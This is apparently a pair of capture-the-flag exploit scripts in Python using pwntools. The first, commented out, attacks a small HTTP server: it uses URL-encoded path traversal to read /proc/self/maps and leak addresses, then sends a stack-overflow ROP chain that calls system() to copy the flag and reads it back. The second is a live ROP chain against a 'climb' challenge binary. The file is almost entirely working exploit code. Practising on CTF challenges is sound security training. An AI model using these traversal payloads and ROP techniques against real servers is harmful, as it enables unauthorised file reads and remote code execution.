# import socket
# import urllib.parse
# import sys
# from pwn import *

# BINARY = "./chal/tiny_patched"
# elf = ELF(BINARY)
# libc = elf.libc

# def send_range_request(host: str, port: int, path: str, range_header: str = None):
#     """
#     Sends a raw HTTP GET request to the specified host and path using pwntools.
#     Returns the decoded response content.
#     """
#     context.log_level = 'info'
#     response_content = b""

#     try:
#         log.info(f"Connecting to {host}:{port}...")
#         conn = remote(host, port)
#         log.info("Connected.")

#         # Build the request
#         request_lines = [
#             f"GET {path} HTTP/1.1",
#             f"Host: {host}:{port}",
#         ]
#         if range_header:
#             request_lines.append(f"Range: bytes={range_header}")
#         request_lines.append("Connection: close")
#         request_lines.append("")
#         request_lines.append("")
#         http_request = "\r\n".join(request_lines)

#         log.info(f"\n--- Sending Request ---\n{http_request}")
#         conn.send(http_request.encode('utf-8'))

#         # Receive all data until EOF
#         response_content = conn.recvall(timeout=5)

#     except Exception as e:
#         log.error(f"An error occurred: {e}")
#     finally:
#         conn.close()
#         log.info("Connection closed.")

#     return response_content.decode('utf-8', errors='ignore')

# def parse_proc_self_maps(maps_content: str):
#     """
#     Parses the content of /proc/self/maps to extract base addresses of libraries.
#     Returns a dictionary mapping library names to their base addresses.
#     """
#     libc_base = 0
#     program_base = 0
#     for line in maps_content.splitlines():
#         if 'libc.so' in line and 'r--p' in line: # first segment of libc
#             try:
#                 address_range = line.split('-')[0]
#                 libc_base = int(address_range, 16)
#                 break 
#             except ValueError:
#                 pass

#     for line in maps_content.splitlines():
#         if 'tiny' in line and 'r--p' in line: # first segment of program
#             try:
#                 address_range = line.split('-')[0]
#                 program_base = int(address_range, 16)
#                 break
#             except ValueError:
#                 pass
    
#     return {'libc_base': libc_base, 'program_base': program_base}

# def send_payload_request(host: str, port: int, uri: str):
#     """
#     Connects to the target server using pwntools, sends the HTTP GET request with
#     the crafted URI, and prints the response.
#     """
#     context.log_level = 'info'

#     try:
#         log.info(f"Connecting to {host}:{port}...")
#         conn = remote(host, port, timeout=5)
#         log.success("Connected.")

#         # Construct the HTTP GET request
#         http_request = (
#             f"GET /{uri} HTTP/1.1\r\n"
#             f"Host: {host}\r\n"
#             f"User-Agent: austun12/1.0\r\n"
#             f"Accept: */*\r\n"
#             f"Connection: close\r\n"
#             f"\r\n"
#         )

#         conn.send(http_request.encode('utf-8'))
#         log.info("Request sent.")
#         return conn
#     except Exception as e:
#         log.error(f"An error occurred: {e}")
#         return None

# if __name__ == "__main__":
#     TARGET_HOST = "tiny.chal.cubectf.com"
#     # TARGET_HOST = "localhost"
#     TARGET_PORT = 9999

#     rop = ROP(elf)

#     LIBC_POP_RAX = 0x45eb0 # pop rax ; ret
#     LIBC_POP_RDX = 0x11f2e7 # pop rdx; pop r12; ret
#     LIBC_DATA_SECTION = 0x21a1e0
#     LIBC_MOV_QWORD_PTR_RDX_RAX = 0x3a410 # mov qword ptr [rdx], rax ; ret
    
#     POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
#     RET = (rop.find_gadget(['ret']))[0]

#     log.info("pop rdi ret: " + hex(POP_RDI))
#     log.info("ret: " + hex(RET))
    
#     SYSTEM = libc.symbols["system"]
    
#     # leak /proc/self/maps with path traversal
#     maps_exploit_path = "/..%2f..%2f..%2f..%2f..%2f..%2fproc%2fself%2fmaps"
#     maps_content = send_range_request(TARGET_HOST, TARGET_PORT, maps_exploit_path, "0-4095")
#     print(maps_content)
    
#     # parse proc_self_maps
#     memory_bases = parse_proc_self_maps(maps_content)
#     libc_base = memory_bases.get('libc_base', 0)
#     program_base = memory_bases.get('program_base', 0)
    
#     elf.address = program_base
#     libc.address = libc_base

#     REAL_LIBC_DATA_SECTION = libc.address + LIBC_DATA_SECTION
    
#     log.info(f"tiny address = {hex(elf.address)}")
#     log.info(f"libc address = {hex(libc.address)}")
#     log.info(f"system offset = {hex(libc.address + SYSTEM)}")

#     command = b"//flag>/tmp/hel\x00"
#     command_part1 = command[0:8]
#     command_part2 = command[8:16]

#     print(f"[*] Running exploit on {TARGET_HOST}:{TARGET_PORT}")
#     payload = b"A"*584 
#     # Write flag command to writable memory 
#     payload += p64(elf.address + RET)
#     payload += p64(libc.address + LIBC_POP_RDX)
#     payload += p64(REAL_LIBC_DATA_SECTION)
#     payload += b"A"*8
#     payload += p64(libc.address + LIBC_POP_RAX)
#     payload += command_part1
#     payload += p64(libc.address + LIBC_MOV_QWORD_PTR_RDX_RAX)
#     payload += p64(elf.address + RET)
#     payload += p64(libc.address + LIBC_POP_RDX)
#     payload += p64(REAL_LIBC_DATA_SECTION + 8)
#     payload += b"A"*8
#     payload += p64(libc.address + LIBC_POP_RAX)
#     payload += command_part2
#     payload += p64(libc.address + LIBC_MOV_QWORD_PTR_RDX_RAX)

#     # Run flag command
#     payload += p64(elf.address + POP_RDI)
#     payload += p64(REAL_LIBC_DATA_SECTION)
#     payload += p64(elf.address + RET)
#     payload += p64(libc.address + SYSTEM)
#     encoded_payload = urllib.parse.quote_from_bytes(payload)
#     content = send_range_request(TARGET_HOST, TARGET_PORT, encoded_payload, "0-999999999999999")
#     print(content)

#     # read /tmp/hel with path traversal
#     tmp_hel = "/..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fhel"
#     flag_content = send_range_request(TARGET_HOST, TARGET_PORT, tmp_hel, "0-4095")
#     print(flag_content)


from pwn import *

context.terminal =  ["tmux", "splitw", "-h"] 
context.endian = 'little'
BINARY = "./chal"
HOST = "climb.2024-bq.ctfcompetition.com"
PORT = 1337

elf = ELF(BINARY)

def start_binary():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

rop = ROP(elf)

# start process
p = start_binary()

if not args.REMOTE:
    gdb.attach(p, """
    b* print_buf
    b* camp2
    b* camp1
    b* summit
    c
    """)

POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]
CAMP1 = elf.symbols['camp1']
CAMP2 = elf.symbols['camp2']
SUMMIT = elf.symbols['summit']
MAIN = elf.symbols['main']
POP_RSI = (rop.find_gadget(['pop rsi', 'ret']))[0]
log.info("CAMP1 func: " + hex(CAMP1))
log.info("CAMP2 func: " + hex(CAMP2))
log.info("SUMMIT func: " + hex(SUMMIT))
log.info("MAIN func: " + hex(MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))
log.info("pop rsi gadget: " + hex(POP_RSI))
log.info("ret: " + hex(RET))

# run process until it encounters help?)
p.recvuntil(b"help?)\n")

payload = b"A"*56 # Overflows the stack by 48 then add 8 bytes for stack alignment
payload += p64(RET) # jump return instruction because remote is weird
payload += p64(CAMP1) # jump to the camp1 function
payload += p64(RET) # jump to the camp1 function
# payload += p64(MAIN)
payload += p64(POP_RDI) # once camp1 returns jump to POP_RDI instruction
payload += b"g" + b"A"*7 # camp2 requires register al to be the letter g so put that first and then pad by 7 bytes
payload += p64(CAMP2) # jump to camp2 function
payload += p64(POP_RDI) # need to jump back to another POP_RDI so the letter c is put in the lower rdi register
payload += b"c" + b"A"*7 
payload += p64(POP_RSI) # jump to a pop rsi instruction for the next if check in summit
payload += b"tf" + b"A"*6
payload += p64(SUMMIT) # jump to the summit function
p.sendline(payload)
print(p.recv())